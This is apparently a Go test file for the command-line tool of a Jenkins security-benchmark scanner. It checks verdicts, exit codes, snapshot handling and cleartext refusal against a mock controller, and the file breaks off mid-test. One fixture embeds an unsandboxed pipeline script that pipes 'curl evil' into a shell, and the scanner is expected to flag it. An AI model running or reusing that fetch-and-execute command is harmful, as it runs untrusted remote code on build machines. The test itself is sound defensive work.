package cli

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"time"

	"github.com/scm-bench/jenkins-bench/internal/engine"
)

// hardenedJob is one pipeline read from a Jenkinsfile in SCM — the shape every
// job-scope control passes or reports NA for.
const hardenedJob = `{"_class":"org.jenkinsci.plugins.workflow.job.WorkflowJob","name":"app","fullName":"app","url":"http://x/job/app/"}`

// controller is a stand-in that answers enough for a scan to complete, with the
// posture given and one hardened job.
func controller(t *testing.T, anonymousAllowed bool) *httptest.Server {
	t.Helper()
	return controllerWithJobs(t, anonymousAllowed, hardenedJob)
}

// controllerWithJobs is controller with the root job listing given as the
// inside of a JSON array.
func controllerWithJobs(t *testing.T, anonymousAllowed bool, jobs string) *httptest.Server {
	t.Helper()
	return controllerServing(t, anonymousAllowed, jobs, nil)
}

// controllerServing is controllerWithJobs plus handlers for paths of the
// test's own, which win over the stand-in's.
func controllerServing(t *testing.T, anonymousAllowed bool, jobs string, extra map[string]http.HandlerFunc) *httptest.Server {
	t.Helper()
	instanceBody := `{"_class":"hudson.model.Hudson","mode":"NORMAL","numExecutors":0,"useSecurity":true,"useCrumbs":true,"jobs":[` + jobs + `]}`
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodGet {
			t.Errorf("the scan issued a %s to %s", r.Method, r.URL.Path)
			w.WriteHeader(http.StatusMethodNotAllowed)
			return
		}
		if h, ok := extra[r.URL.Path]; ok {
			h(w, r)
			return
		}
		_, _, authed := r.BasicAuth()
		switch r.URL.Path {
		case "/login":
			w.Header().Set("X-Jenkins", "2.541.2")
			return
		case "/api/json":
			if !authed && !anonymousAllowed {
				w.WriteHeader(http.StatusForbidden)
				return
			}
			fmt.Fprint(w, instanceBody)
			return
		}
		if !authed {
			w.WriteHeader(http.StatusForbidden)
			return
		}
		switch r.URL.Path {
		case "/computer/api/json":
			fmt.Fprint(w, `{"computer":[{"_class":"hudson.model.Hudson$MasterComputer","displayName":"Built-In Node","numExecutors":0}]}`)
		case "/pluginManager/api/json":
			// An audit plugin, so the hardened posture passes CIS-2.1.3.
			fmt.Fprint(w, `{"plugins":[{"shortName":"audit-trail","version":"3.14","enabled":true,"active":true,"hasUpdate":false}]}`)
		case "/updateCenter/site/default/api/json":
			// The timestamp is minted per request rather than hard-coded:
			// the plugin currency control compares it against the scan time,
			// and a constant would turn into "data too stale, MANUAL" the
			// month after it was written — a test that starts failing by
			// calendar, with no change in the code under test.
			fmt.Fprintf(w, `{"url":"https://updates.jenkins.io/update-center.json","dataTimestamp":%d}`, time.Now().Add(-time.Hour).UnixMilli())
		case "/credentials/api/json":
			fmt.Fprint(w, `{"stores":{"system":{"domains":{"_":{"credentials":[]}}}}}`)
		case "/job/app/api/json":
			fmt.Fprint(w, `{"_class":"org.jenkinsci.plugins.workflow.job.WorkflowJob","name":"app","fullName":"app","disabled":false,"buildable":true}`)
		case "/job/app/config.xml":
			fmt.Fprint(w, `<?xml version='1.1' encoding='UTF-8'?><flow-definition>
				<definition class="org.jenkinsci.plugins.workflow.cps.CpsScmFlowDefinition"><scriptPath>Jenkinsfile</scriptPath></definition>
				<disabled>false</disabled></flow-definition>`)
		default:
			w.WriteHeader(http.StatusNotFound)
		}
	}))
	t.Cleanup(srv.Close)
	return srv
}

// A token without Job/Read is not refused the job list: the controller answers
// 200 with {"jobs":[]}, exactly as it would for a controller that has none.
// v0.1 evaluated the controller-scope controls, found nothing wrong with them
// and exited 0 — a green CI step for a scan that audited no job at all.
func TestScanThatEvaluatedNoJobsExitsTwo(t *testing.T) {
	srv := controllerWithJobs(t, false, "")
	out, err := runScanCmd(t, "scan", "--url", srv.URL, "--username", "u", "--token", "t", "--no-color")
	if code := ExitCode(err); code != ExitError {
		t.Fatalf("exit code = %d (%v), want %d: nothing job-scope was audited\n%s", code, err, ExitError, out)
	}
	if !strings.Contains(err.Error(), "Job/Read") {
		t.Errorf("the message should name the permission that makes jobs visible: %v", err)
	}
	// The report is still written: the controller-scope verdicts are real,
	// and the reader needs them to see what the scan did manage.
	if !strings.Contains(out, "SCORE") {
		t.Errorf("the report should still be written:\n%s", out)
	}
}

// A run narrowed to controller-scope controls asked nothing about jobs, so an
// empty job list leaves nothing unanswered.
func TestScanOfControllerControlsAloneNeedsNoJobs(t *testing.T) {
	srv := controllerWithJobs(t, false, "")
	out, err := runScanCmd(t, "scan", "--url", srv.URL, "--username", "u", "--token", "t", "--no-color",
		"--set", "include=[CIS-2.1.6]")
	if err != nil {
		t.Fatalf("a controller-only run should not need jobs: %v\n%s", err, out)
	}
}

// scan.skipDisabledJobs can empty the job list as surely as a missing
// permission, and the result is the same: nothing job-scope was audited.
func TestScanWhoseJobsWereAllSkippedExitsTwo(t *testing.T) {
	path := filepath.Join(t.TempDir(), "s.json")
	snap := `{"schemaVersion":"1","metadata":{"tool":"jenkins-bench","platform":"jenkins"},
		"controller":{"available":{"root":true,"jobs":true}},
		"jobs":[{"fullName":"old","disabled":true,"available":{"api":true,"config":true},"definition":{"source":"ui"}}]}`
	if err := os.WriteFile(path, []byte(snap), 0o600); err != nil {
		t.Fatal(err)
	}
	_, err := runScanCmd(t, "scan", "--snapshot-in", path, "--set", "skipDisabledJobs=true", "--no-color")
	if code := ExitCode(err); code != ExitError {
		t.Fatalf("exit code = %d (%v), want %d", code, err, ExitError)
	}
	if !strings.Contains(err.Error(), "skipDisabledJobs") {
		t.Errorf("the message should say the setting dropped them: %v", err)
	}
}

// runScanCmd executes the command tree and returns what it wrote — stdout,
// then stderr — and the error, so the exit code can be asserted rather than the
// process killed.
func runScanCmd(t *testing.T, args ...string) (string, error) {
	t.Helper()
	stdout, stderr, err := runScanSplit(t, args...)
	return stdout + stderr, err
}

// runScanSplit is runScanCmd with the two streams kept apart, for a test that
// parses the report: stderr carries the trace's closing line.
func runScanSplit(t *testing.T, args ...string) (string, string, error) {
	t.Helper()
	// A config file discovered in the developer's own home directory would make
	// these assertions depend on their machine.
	t.Setenv("JENKINS_BENCH_CONFIG_DIR", t.TempDir())
	t.Setenv("JENKINS_URL", "")
	t.Setenv("JENKINS_USER", "")
	t.Setenv("JENKINS_TOKEN", "")

	var stdout, stderr bytes.Buffer
	root := NewRootCommand()
	root.SetOut(&stdout)
	root.SetErr(&stderr)
	root.SetArgs(args)
	err := root.Execute()
	return stdout.String(), stderr.String(), err
}

func TestScanReportsAHardenedController(t *testing.T) {
	srv := controller(t, false)
	out, err := runScanCmd(t, "scan", "--url", srv.URL, "--username", "u", "--token", "t", "--no-color")
	if err != nil {
		t.Fatalf("a hardened controller should exit 0: %v\n%s", err, out)
	}
	if !strings.Contains(out, "SCORE") {
		t.Errorf("no score line:\n%s", out)
	}
	// Not 100/100: the always-MANUAL controls (single responsibility, worker
	// provenance, and so on) are in every scan, and they leave the score's
	// denominator rather than lowering it. Clean here means nothing failed.
	if !strings.Contains(out, "0 failed") {
		t.Errorf("expected no failures:\n%s", out)
	}
}

// The whole point of the probe: a controller an unauthenticated client can read
// fails, and exits 1 rather than 0.
func TestScanFailsWhenAnonymousCanRead(t *testing.T) {
	srv := controller(t, true)
	out, err := runScanCmd(t, "scan", "--url", srv.URL, "--username", "u", "--token", "t", "--no-color")
	if err == nil {
		t.Fatalf("a controller readable by anyone should not exit 0:\n%s", out)
	}
	if code := ExitCode(err); code != ExitFindings {
		t.Errorf("exit code = %d, want %d", code, ExitFindings)
	}
	if !strings.Contains(out, "CIS-2.1.6") {
		t.Errorf("the finding should name the control:\n%s", out)
	}
	// The fix has to name a place to act, or it wastes the reader's time
	// before they discover it does not help.
	if !strings.Contains(out, "Manage Jenkins") {
		t.Errorf("the remediation names no settings path:\n%s", out)
	}
}

func TestScanRoundTripsASnapshot(t *testing.T) {
	srv := controller(t, false)
	path := filepath.Join(t.TempDir(), "snapshot.json")

	online, _, err := runScanSplit(t, "scan", "--url", srv.URL, "--username", "u", "--token", "t",
		"--snapshot-out", path, "-o", "json")
	if err != nil {
		t.Fatalf("scan: %v\n%s", err, online)
	}

	info, err := os.Stat(path)
	if err != nil {
		t.Fatal(err)
	}
	// The snapshot holds no secrets by construction, but it is a complete map
	// of a controller's weak points. On Windows the 0600 has no effect — NTFS
	// has no POSIX permission bits and Stat reports 666 — and honouring ACLs
	// there is a feature this has not implemented, so the honest thing is to
	// skip the assertion rather than assert something weaker and let the
	// promise look kept.
	if runtime.GOOS == "windows" {
		t.Logf("snapshot permissions are not enforced on Windows (got %o)", info.Mode().Perm())
	} else if perm := info.Mode().Perm(); perm != 0o600 {
		t.Errorf("snapshot permissions = %o, want 600", perm)
	}

	// Re-evaluating offline, with no network and no token, must produce the
	// same verdicts — that property is what makes a snapshot worth keeping.
	offline, _, err := runScanSplit(t, "scan", "--snapshot-in", path, "-o", "json")
	if err != nil {
		t.Fatalf("offline scan: %v\n%s", err, offline)
	}

	type report struct {
		Findings []struct {
			CheckID  string `json:"checkId"`
			Resource string `json:"resource"`
			Status   string `json:"status"`
		} `json:"findings"`
		Score struct {
			Value int `json:"value"`
		} `json:"score"`
	}
	var a, b report
	if err := json.Unmarshal([]byte(online), &a); err != nil {
		t.Fatalf("online report: %v", err)
	}
	if err := json.Unmarshal([]byte(offline), &b); err != nil {
		t.Fatalf("offline report: %v", err)
	}
	if a.Score.Value != b.Score.Value {
		t.Errorf("score changed between online (%d) and offline (%d)", a.Score.Value, b.Score.Value)
	}
	if len(a.Findings) != len(b.Findings) {
		t.Fatalf("finding count changed: %d then %d", len(a.Findings), len(b.Findings))
	}
	for i := range a.Findings {
		if a.Findings[i] != b.Findings[i] {
			t.Errorf("finding %d differs: %+v then %+v", i, a.Findings[i], b.Findings[i])
		}
	}
}

// A control that could not be evaluated must not read as one that passed, and
// the score must be 0 rather than 100 when nothing was decidable.
func TestScanReportsManualForWhatItCouldNotRead(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "blind.json")
	blind := `{"schemaVersion":"1","metadata":{"tool":"jenkins-bench","platform":"jenkins"},
		"controller":{"available":{"root":false,"jobs":true},"errors":["the instance API could not be read (HTTP 403)"]},
		"jobs":[{"fullName":"app","available":{"api":true,"config":false},"errors":["HTTP 403"]}]}`
	if err := os.WriteFile(path, []byte(blind), 0o600); err != nil {
		t.Fatal(err)
	}

	out, err := runScanCmd(t, "scan", "--snapshot-in", path, "--no-color")
	if err != nil {
		t.Fatalf("an all-MANUAL scan is a successful scan: %v\n%s", err, out)
	}
	if strings.Contains(out, "100/100") {
		t.Errorf("an all-MANUAL report must not read as a clean bill of health:\n%s", out)
	}
	if !strings.Contains(out, "0/100") {
		t.Errorf("score should be 0 when nothing was decidable:\n%s", out)
	}
	// The exact count moves every time a control lands; the property is that
	// the manual tally is non-zero and the score did not read as clean.
	if strings.Contains(out, " 0 manual") {
		t.Errorf("the manual count is what explains the zero:\n%s", out)
	}
}

// maxManual exists because MANUAL leaves both sides of the score: a token that
// can read very little otherwise produces a high score from a small sample.
func TestScanFailsWhenTooMuchWentUnread(t *testing.T) {
	path := filepath.Join(t.TempDir(), "blind.json")
	blind := `{"schemaVersion":"1","metadata":{"tool":"jenkins-bench","platform":"jenkins"},
		"controller":{"available":{"root":false,"jobs":true}},
		"jobs":[{"fullName":"app","available":{"api":true,"config":false}}]}`
	if err := os.WriteFile(path, []byte(blind), 0o600); err != nil {
		t.Fatal(err)
	}

	out, err := runScanCmd(t, "scan", "--snapshot-in", path, "--set", "scan.maxManual=50", "--no-color")
	if err == nil {
		t.Fatalf("100%% manual against a 50%% ceiling should exit 1:\n%s", out)
	}
	if code := ExitCode(err); code != ExitFindings {
		t.Errorf("exit code = %d, want %d", code, ExitFindings)
	}
	if !strings.Contains(err.Error(), "manual review") {
		t.Errorf("the message should say what happened: %v", err)
	}
}

func TestScanRejectsAnUnknownFormat(t *testing.T) {
	path := filepath.Join(t.TempDir(), "s.json")
	if err := os.WriteFile(path, []byte(`{"schemaVersion":"1","metadata":{"platform":"jenkins"},"controller":{"available":{}}}`), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := runScanCmd(t, "scan", "--snapshot-in", path, "-o", "yaml"); err == nil {
		t.Error("an unknown format should be rejected")
	}
}

// A file that merely parses as JSON is not a snapshot. Accepting it would
// evaluate an empty controller into a page of MANUALs with a clean exit code,
// which reads exactly like a real least-privilege scan.
func TestScanRejectsAFileThatIsNotASnapshot(t *testing.T) {
	path := filepath.Join(t.TempDir(), "s.json")
	if err := os.WriteFile(path, []byte(`{"broken":true}`), 0o600); err != nil {
		t.Fatal(err)
	}
	_, err := runScanCmd(t, "scan", "--snapshot-in", path)
	if err == nil {
		t.Fatal("a JSON file without a schemaVersion must be refused")
	}
	if !strings.Contains(err.Error(), "schemaVersion") {
		t.Errorf("the error should name what is missing: %v", err)
	}
}

// A snapshot that does not say which platform it came from cannot be matched
// against this bench's controls.
func TestScanRejectsASnapshotWithoutAPlatform(t *testing.T) {
	path := filepath.Join(t.TempDir(), "s.json")
	if err := os.WriteFile(path, []byte(`{"schemaVersion":"1","controller":{"available":{}}}`), 0o600); err != nil {
		t.Fatal(err)
	}
	_, err := runScanCmd(t, "scan", "--snapshot-in", path)
	if err == nil {
		t.Fatal("a snapshot without a platform must be refused")
	}
	if !strings.Contains(err.Error(), "platform") {
		t.Errorf("the error should say what is missing: %v", err)
	}
}

func TestScanRejectsASnapshotFromAnotherSchema(t *testing.T) {
	path := filepath.Join(t.TempDir(), "s.json")
	if err := os.WriteFile(path, []byte(`{"schemaVersion":"99","controller":{"available":{}}}`), 0o600); err != nil {
		t.Fatal(err)
	}
	_, err := runScanCmd(t, "scan", "--snapshot-in", path)
	if err == nil {
		t.Fatal("a snapshot from a different shape must not be read as if it were this one")
	}
	if !strings.Contains(err.Error(), "schemaVersion") {
		t.Errorf("the error should name the mismatch: %v", err)
	}
}

func TestScanNeedsAURL(t *testing.T) {
	_, err := runScanCmd(t, "scan")
	if err == nil {
		t.Fatal("a scan with nowhere to look should be an error")
	}
	if !strings.Contains(err.Error(), "--url") {
		t.Errorf("the error should say what to pass: %v", err)
	}
}

// Sending a credential in cleartext to a host that is not this machine should
// take an explicit decision, not happen quietly.
func TestScanRefusesCleartextCredentials(t *testing.T) {
	_, err := runScanCmd(t, "scan", "--url", "http://jenkins.invalid", "--username", "u", "--token", "t")
	if err == nil {
		t.Fatal("http:// to a remote host should be refused")
	}
	if !strings.Contains(err.Error(), "cleartext") {
		t.Errorf("the error should explain: %v", err)
	}
	if strings.Contains(err.Error(), "\"t\"") {
		t.Error("the error must not echo the token")
	}
}

func TestScanReadsCredentialsFromTheEnvironment(t *testing.T) {
	srv := controller(t, false)
	t.Setenv("JENKINS_BENCH_CONFIG_DIR", t.TempDir())
	t.Setenv("JENKINS_URL", srv.URL)
	t.Setenv("JENKINS_USER", "u")
	t.Setenv("JENKINS_TOKEN", "t")

	var out bytes.Buffer
	root := NewRootCommand()
	root.SetOut(&out)
	root.SetErr(&out)
	root.SetArgs([]string{"scan", "--no-color"})
	if err := root.Execute(); err != nil {
		t.Fatalf("scan: %v\n%s", err, out.String())
	}
	if !strings.Contains(out.String(), "SCORE") {
		t.Errorf("no report:\n%s", out.String())
	}
}

// The refusal message names the escape hatch, so both spellings of it must
// lead somewhere: --set works, and the flag form gets directions instead of
// cobra's bare "unknown flag". A user followed the old message's advice and
// hit a dead end.
func TestAllowPlaintextEscapeHatch(t *testing.T) {
	// maxDuration bounds the run: an unreachable host is otherwise a full
	// retry schedule per endpoint. The deadline error proves the point either
	// way — the scan got past the refusal and out to the network.
	_, err := runScanCmd(t, "scan", "--url", "http://jenkins.invalid", "--username", "u", "--token", "t",
		"--set", "scan.allowPlaintext=true", "--set", "scan.maxDuration=2s")
	if err != nil && strings.Contains(err.Error(), "cleartext") {
		t.Errorf("--set scan.allowPlaintext=true did not clear the refusal: %v", err)
	}

	_, err = runScanCmd(t, "scan", "--url", "http://jenkins.invalid", "--allow-plaintext")
	if err == nil {
		t.Fatal("the flag form does not exist")
	}
	for _, want := range []string{"--set scan.allowPlaintext", "config key"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("the flag form should get directions containing %q: %v", want, err)
		}
	}
}

func TestRefusalMessageNamesAWorkingEscapeHatch(t *testing.T) {
	_, err := runScanCmd(t, "scan", "--url", "http://jenkins.example.com", "--username", "u", "--token", "t")
	if err == nil {
		t.Fatal("cleartext to a remote host should be refused")
	}
	if !strings.Contains(err.Error(), "--set scan.allowPlaintext=true") {
		t.Errorf("the refusal should name the escape hatch that exists: %v", err)
	}
}

// Both halves of the summary must count the same population: findings rather
// than distinct resources turned one failing job into "across 3 resources".
func TestFailureSummaryCountsDistinctResources(t *testing.T) {
	fail := func(check, resource, severity string) engine.Finding {
		return engine.Finding{
			CheckID:  check,
			Severity: severity,
			Status:   engine.StatusFail,
			Resource: resource,
		}
	}

	cases := []struct {
		name string
		rep  engine.Report
		want string
	}{
		{
			name: "one control on one resource names no resource count",
			rep:  engine.Report{Findings: []engine.Finding{fail("CIS-2.2.3", "controller", "HIGH")}},
			want: "1 control failed at or above HIGH",
		},
		{
			name: "several controls on the same resource stay at one resource",
			rep: engine.Report{Findings: []engine.Finding{
				fail("CIS-2.1.6", "controller", "HIGH"),
				fail("CIS-2.2.3", "controller", "HIGH"),
			}},
			want: "2 controls failed at or above HIGH",
		},
		{
			name: "one control across several jobs counts the jobs once each",
			rep: engine.Report{Findings: []engine.Finding{
				fail("CIS-2.3.1", "legacy-build", "HIGH"),
				fail("CIS-2.3.1", "platform/inline-deploy", "HIGH"),
				fail("CIS-2.3.5", "legacy-build", "HIGH"),
			}},
			want: "2 controls failed at or above HIGH, across 2 resources",
		},
		{
			name: "findings below the threshold are not counted",
			rep: engine.Report{Findings: []engine.Finding{
				fail("CIS-2.2.3", "controller", "HIGH"),
				fail("CIS-2.3.5", "legacy-build", "MEDIUM"),
			}},
			want: "1 control failed at or above HIGH",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := failureSummary(&tc.rep, "high"); got != tc.want {
				t.Errorf("failureSummary() = %q, want %q", got, tc.want)
			}
		})
	}
}

// A folder whose listing fails takes every job inside it out of the scan.
// v0.1 turned the failure into a warning and carried on: the remaining jobs
// scored 100/100 and the scan exited 0, with the folder that went unread being
// precisely the one nobody was allowed to look into.
func TestScanThatCouldNotListAFolderExitsTwo(t *testing.T) {
	for _, status := range []int{http.StatusInternalServerError, http.StatusForbidden} {
		t.Run(http.StatusText(status), func(t *testing.T) {
			srv := controllerServing(t, false,
				hardenedJob+`,{"_class":"com.cloudbees.hudson.plugins.folder.Folder","name":"prod","fullName":"prod","url":"http://x/job/prod/"}`,
				map[string]http.HandlerFunc{
					"/job/prod/api/json": func(w http.ResponseWriter, r *http.Request) { w.WriteHeader(status) },
				})
			out, err := runScanCmd(t, "scan", "--url", srv.URL, "--username", "u", "--token", "t", "--no-color",
				"--set", "scan.timeout=5s")
			if code := ExitCode(err); code != ExitError {
				t.Fatalf("exit code = %d (%v), want %d: the jobs in prod were never seen\n%s", code, err, ExitError, out)
			}
			if !strings.Contains(err.Error(), "prod") {
				t.Errorf("the message should name the folder that could not be listed: %v", err)
			}
			// The rest of the controller was audited, and the report says so.
			if !strings.Contains(out, "SCORE") || !strings.Contains(out, "prod") {
				t.Errorf("the report should still be written, naming the folder:\n%s", out)
			}

			// An operator who knows the folder is off-limits can accept a
			// partial scan, deliberately and in writing.
			_, err = runScanCmd(t, "scan", "--url", srv.URL, "--username", "u", "--token", "t", "--no-color",
				"--set", "scan.allowIncomplete=true", "--set", "scan.timeout=5s")
			if err != nil {
				t.Errorf("scan.allowIncomplete should accept the partial scan: %v", err)
			}
		})
	}
}

// A snapshot that does not record its job list as complete — written by an
// older build, or edited — proves nothing about the jobs it would have held.
func TestScanOfASnapshotWithoutAListingRecordIsIncomplete(t *testing.T) {
	path := filepath.Join(t.TempDir(), "s.json")
	snap := `{"schemaVersion":"1","metadata":{"tool":"jenkins-bench","platform":"jenkins"},
		"controller":{"available":{"root":true}},
		"jobs":[{"fullName":"app","available":{"api":true,"config":false}}]}`
	if err := os.WriteFile(path, []byte(snap), 0o600); err != nil {
		t.Fatal(err)
	}
	_, err := runScanCmd(t, "scan", "--snapshot-in", path, "--no-color")
	if code := ExitCode(err); code != ExitError {
		t.Fatalf("exit code = %d (%v), want %d", code, err, ExitError)
	}
	if !strings.Contains(err.Error(), "allowIncomplete") {
		t.Errorf("the message should name the way to accept it: %v", err)
	}
}

func TestIncompleteSummaryNamesTheContainers(t *testing.T) {
	got := incompleteSummary(engine.Coverage{Unlisted: []string{"/", "prod", "a", "b", "c", "d"}})
	for _, want := range []string{"6 containers", "the top level", `"prod"`, "and 1 more", "scan.allowIncomplete"} {
		if !strings.Contains(got, want) {
			t.Errorf("summary %q should contain %q", got, want)
		}
	}
}

// verdicts runs a JSON scan and returns each finding's status by control and
// resource.
func verdicts(t *testing.T, args ...string) (map[string]string, error) {
	t.Helper()
	out, _, err := runScanSplit(t, append(args, "-o", "json")...)
	var rep struct {
		Findings []struct {
			CheckID  string `json:"checkId"`
			Resource string `json:"resource"`
			Status   string `json:"status"`
		} `json:"findings"`
	}
	if jsonErr := json.Unmarshal([]byte(out), &rep); jsonErr != nil {
		t.Fatalf("not a JSON report (%v): %v\n%s", jsonErr, err, out)
	}
	got := map[string]string{}
	for _, f := range rep.Findings {
		got[f.CheckID+" "+f.Resource] = f.Status
	}
	return got, err
}

// The false PASS the audit found first: a Generic Webhook Trigger token starts
// a build through POST /generic-webhook-trigger/invoke?token=… with no Jenkins
// login at all (verified against 2.580.1), and v0.1 only ever looked at
// <authToken>. A multibranch project passed too, although the triggers its
// builds run under are declared in each branch's Jenkinsfile and land in branch
// jobs the scan never reads.
func TestScanJudgesTriggersBeyondAuthToken(t *testing.T) {
	gwt := `<?xml version='1.1' encoding='UTF-8'?><flow-definition>
		<properties><org.jenkinsci.plugins.workflow.job.properties.PipelineTriggersJobProperty><triggers>
		<org.jenkinsci.plugins.gwt.GenericTrigger plugin="generic-webhook-trigger@2.4.3"><spec></spec><token>s3cret</token></org.jenkinsci.plugins.gwt.GenericTrigger>
		</triggers></org.jenkinsci.plugins.workflow.job.properties.PipelineTriggersJobProperty></properties>
		<definition class="org.jenkinsci.plugins.workflow.cps.CpsScmFlowDefinition"><scriptPath>Jenkinsfile</scriptPath></definition>
		<disabled>false</disabled></flow-definition>`
	mb := `<?xml version='1.1' encoding='UTF-8'?><org.jenkinsci.plugins.workflow.multibranch.WorkflowMultiBranchProject>
		<triggers/><disabled>false</disabled>
		<factory class="org.jenkinsci.plugins.workflow.multibranch.WorkflowBranchProjectFactory"><scriptPath>Jenkinsfile</scriptPath></factory>
		</org.jenkinsci.plugins.workflow.multibranch.WorkflowMultiBranchProject>`
	serve := func(body string) http.HandlerFunc {
		return func(w http.ResponseWriter, r *http.Request) { fmt.Fprint(w, body) }
	}
	srv := controllerServing(t, false,
		hardenedJob+`,{"_class":"org.jenkinsci.plugins.workflow.job.WorkflowJob","name":"gwt","fullName":"gwt","url":"http://x/job/gwt/"}`+
			`,{"_class":"org.jenkinsci.plugins.workflow.multibranch.WorkflowMultiBranchProject","name":"mb","fullName":"mb","url":"http://x/job/mb/"}`,
		map[string]http.HandlerFunc{
			"/job/gwt/api/json":   serve(`{"disabled":false,"buildable":true}`),
			"/job/gwt/config.xml": serve(gwt),
			"/job/mb/api/json":    serve(`{"buildable":true}`),
			"/job/mb/config.xml":  serve(mb),
		})

	got, _ := verdicts(t, "scan", "--url", srv.URL, "--username", "u", "--token", "t")
	for key, want := range map[string]string{
		"CIS-2.3.5 gwt": "FAIL",
		"CIS-2.3.5 mb":  "MANUAL",
		"CIS-2.3.5 app": "PASS",
	} {
		if got[key] != want {
			t.Errorf("%s = %q, want %s", key, got[key], want)
		}
	}
}

// multibranchConfig is a multibranch project whose branch jobs come from the
// given <factory> element.
func multibranchConfig(factory string) string {
	return `<?xml version='1.1' encoding='UTF-8'?><org.jenkinsci.plugins.workflow.multibranch.WorkflowMultiBranchProject plugin="workflow-multibranch@842">
		<triggers/><disabled>false</disabled>
		<sources class="jenkins.branch.MultiBranchProject$BranchSourceList"><data><jenkins.branch.BranchSource>
		<source class="jenkins.plugins.git.GitSCMSource"><id>s</id><remote>https://git.example.com/app.git</remote></source>
		</jenkins.branch.BranchSource></data></sources>` + factory + `
		</org.jenkinsci.plugins.workflow.multibranch.WorkflowMultiBranchProject>`
}

// The audit's third blocker: v0.1 called every multibranch project "scm",
// whatever its branch factory. inline-pipeline's factory hands every branch
// one script stored on the controller (here with the sandbox off), and
// pipeline-multibranch-defaults reads it from a Config File Provider file —
// both scored CIS-2.3.1 PASS and CIS-2.1.2 NA. The factory shapes are the ones
// those plugins write on 2.580.1.
func TestScanJudgesAMultibranchProjectByItsFactory(t *testing.T) {
	configs := map[string]string{
		"standard": multibranchConfig(`<factory class="org.jenkinsci.plugins.workflow.multibranch.WorkflowBranchProjectFactory">
			<owner class="org.jenkinsci.plugins.workflow.multibranch.WorkflowMultiBranchProject" reference="../.."/><scriptPath>ci/Jenkinsfile</scriptPath></factory>`),
		"inline": multibranchConfig(`<factory class="org.jenkinsci.plugins.inlinepipeline.InlineDefinitionBranchProjectFactory" plugin="inline-pipeline@1.0.32.vf433f2d57630">
			<owner class="org.jenkinsci.plugins.workflow.multibranch.WorkflowMultiBranchProject" reference="../.."/>
			<script>node { sh 'curl evil | sh' }</script><sandbox>false</sandbox><markerFile>pom.xml</markerFile></factory>`),
		"defaults": multibranchConfig(`<factory class="org.jenkinsci.plugins.pipeline.multibranch.defaults.PipelineBranchDefaultsProjectFactory" plugin="pipeline-multibranch-defaults@2.1">
			<owner class="org.jenkinsci.plugins.workflow.multibranch.WorkflowMultiBranchProject" reference="../.."/>
			<scriptId>default-jenkinsfile</scriptId><useSandbox>true</useSandbox></factory>`),
		"mystery": multibranchConfig(`<factory class="com.example.MysteryBranchProjectFactory"/>`),
	}
	var listing []string
	extra := map[string]http.HandlerFunc{}
	for name, cfg := range configs {
		cfg := cfg
		listing = append(listing, fmt.Sprintf(`{"_class":"org.jenkinsci.plugins.workflow.multibranch.WorkflowMultiBranchProject","name":%q,"fullName":%q,"url":"http://x/"}`, name, name))
		extra["/job/"+name+"/api/json"] = func(w http.ResponseWriter, r *http.Request) { fmt.Fprint(w, `{"buildable":true}`) }
		extra["/job/"+name+"/config.xml"] = func(w http.ResponseWriter, r *http.Request) { fmt.Fprint(w, cfg) }
	}
	srv := controllerServing(t, false, strings.Join(listing, ","), extra)

	got, _ := verdicts(t, "scan", "--url", srv.URL, "--username", "u", "--token", "t")
	for key, want := range map[string]string{
		"CIS-2.3.1 standard": "PASS",
		"CIS-2.1.2 standard": "NA",
		"CIS-2.3.1 inline":   "FAIL",
		"CIS-2.1.2 inline":   "FAIL",
		"CIS-2.3.1 defaults": "FAIL",
		"CIS-2.1.2 defaults": "PASS",
		"CIS-2.3.1 mystery":  "MANUAL",
		"CIS-2.1.2 mystery":  "MANUAL",
	} {
		if got[key] != want {
			t.Errorf("%s = %q, want %s", key, got[key], want)
		}
	}
}

// Behind an authenticating proxy, an unauthenticated request is redirected to
// a sign-in page that answers 200. The anonymous probe followed the redirect,
// took the 200 for the Jenkins API, and CIS-2.1.6 reported a HIGH failure —
// "an unauthenticated client can read this controller" — on a controller
// nobody can reach without signing in. exit 1, for a false FAIL.
func TestScanDoesNotTakeASignInPageForAnonymousAccess(t *testing.T) {
	signIn := func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html")
		fmt.Fprint(w, "<html><body>Sign in with SSO</body></html>")
	}
	instance := `{"_class":"hudson.model.Hudson","mode":"NORMAL","numExecutors":0,"useSecurity":true,"useCrumbs":true,"jobs":[` + hardenedJob + `]}`
	srv := controllerServing(t, false, hardenedJob, map[string]http.HandlerFunc{
		"/oauth2/sign_in": signIn,
		"/api/json": func(w http.ResponseWriter, r *http.Request) {
			if _, _, ok := r.BasicAuth(); !ok {
				http.Redirect(w, r, "/oauth2/sign_in?rd=%2Fapi%2Fjson", http.StatusFound)
				return
			}
			fmt.Fprint(w, instance)
		},
	})
	got, err := verdicts(t, "scan", "--url", srv.URL, "--username", "u", "--token", "t")
	if got["CIS-2.1.6 controller"] == "FAIL" {
		t.Fatalf("a sign-in page is not anonymous access: CIS-2.1.6 FAIL (%v)", err)
	}
	if got["CIS-2.1.6 controller"] != "MANUAL" {
		t.Errorf("CIS-2.1.6 = %q, want MANUAL: the probe was redirected, not answered", got["CIS-2.1.6 controller"])
	}
}

// A config file found in the working directory changes how the scan judges and
// when it fails — and a pull request can add one. The scan names every config
// file it reads, on stderr, found or given.
func TestScanNamesTheConfigFileItUses(t *testing.T) {
	path := filepath.Join(t.TempDir(), "s.json")
	snap := `{"schemaVersion":"1","metadata":{"tool":"jenkins-bench","platform":"jenkins"},
		"controller":{"available":{"root":true,"jobs":true}},
		"jobs":[{"fullName":"app","available":{"api":true,"config":false}}]}`
	if err := os.WriteFile(path, []byte(snap), 0o600); err != nil {
		t.Fatal(err)
	}

	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "jenkins-bench.yaml"), []byte("scan:\n  failOn: none\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	t.Chdir(dir)
	out, err := runScanCmd(t, "scan", "--snapshot-in", path, "--no-color")
	if err != nil {
		t.Fatalf("scan: %v\n%s", err, out)
	}
	if !strings.Contains(out, "using config jenkins-bench.yaml") {
		t.Errorf("a discovered config file must be named:\n%s", out)
	}

	given := filepath.Join(t.TempDir(), "ci.yaml")
